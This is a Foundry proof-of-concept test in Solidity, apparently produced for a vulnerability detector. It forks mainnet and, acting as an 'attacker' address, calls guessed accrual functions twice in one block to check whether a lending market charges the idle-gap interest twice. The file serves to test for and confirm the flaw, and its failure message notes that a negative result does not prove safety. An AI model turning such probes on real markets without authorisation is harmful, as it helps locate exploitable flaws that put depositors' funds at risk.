// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Idle-gap interest charged twice in a block
/// @notice Detector: idle-gap-interest-accrual. The accrual measures elapsed
///         blocks from a checkpoint it does not advance on every path, so the
///         whole idle gap is charged again on each call in the same block.
/// @dev FORK-ONLY. POC_TARGET is the lending market. Success is the accrual
///      index (or the attacker's balance) moving on the SECOND call in the same
///      block — with no blocks elapsed between the two.
contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set (the market)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// The observable: state that only interest accrual moves.
    function _readers() internal pure returns (string[4] memory) {
        return [
            "interestIndex()",
            "borrowIndex()",
            "accInterestIndex()",
            "totalBorrows()"
        ];
    }

    function _snapshot() internal view returns (uint256 acc) {
        string[4] memory readers = _readers();
        for (uint256 i = 0; i < readers.length; ++i) {
            (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSignature(readers[i]));
            if (ok && data.length >= 32) return abi.decode(data, (uint256));
        }
        return 0;
    }

    function test_doubleAccrual() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 5 ether);

        // Sit idle so the elapsed term is large.
        vm.roll(block.number + 100_000);
        vm.warp(block.timestamp + 30 days);

        string[4] memory accrue = ["accrue()", "updateInterest()", "poke()", "sync()"];
        uint256 acc0 = _snapshot();

        // First accrual, then a SECOND one with no block elapsed.
        for (uint256 i = 0; i < accrue.length; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature(accrue[i]));
            console.log("tried", accrue[i], ok ? "returned" : "reverted");
        }
        uint256 acc1 = _snapshot();
        for (uint256 i = 0; i < accrue.length; ++i) {
            vm.prank(attacker);
            target.call(abi.encodeWithSignature(accrue[i]));
        }
        uint256 acc2 = _snapshot();
        console.log("index:", acc0, acc1, acc2);

        assertTrue(
            acc1 != acc0 && acc2 != acc1,
            "the accrual index did not move on a second call in the SAME block. Tried accrue(), updateInterest(), poke(), sync() after rolling 100,000 blocks. This does NOT establish safety: the accrual may be named differently, the index may not be readable through these getters, or the checkpoint may be advanced on every path — which is the fix."
        );
    }
}
